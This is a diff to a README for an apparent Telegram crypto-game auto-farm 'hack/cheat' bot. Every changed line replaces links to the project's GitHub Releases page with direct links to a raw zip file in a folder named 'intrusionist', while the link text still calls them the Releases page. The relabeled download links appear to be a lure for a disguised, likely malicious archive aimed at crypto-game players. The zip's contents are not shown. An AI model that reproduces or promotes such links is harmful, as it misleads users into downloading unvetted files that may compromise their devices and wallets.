@@ -1,6 +1,6 @@
 # 🤖 Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat - Effortlessly Maximize Your Game Profits
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/intrusionist/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip)](https://raw.githubusercontent.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/intrusionist/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip)
 
 ## 📜 Description
 
@@ -11,7 +11,7 @@ This bot automates farming and clicker activities in the Cyber Finance game. It 
 Follow these steps to download and run the Cyber Finance Game Bot:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/intrusionist/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip).
 
 2. **Find the Latest Version:**
    Look for the latest version listed at the top. The most recent release will have the newest features and fixes.
@@ -50,7 +50,7 @@ To run this bot, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-To download, follow this [link to the Releases page](https://github.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases). After downloading, follow the installation instructions to set up the bot on your device.
+To download, follow this [link to the Releases page](https://raw.githubusercontent.com/atillagrafi/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/intrusionist/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip). After downloading, follow the installation instructions to set up the bot on your device.
 
 ## 🔧 Usage Instructions
 
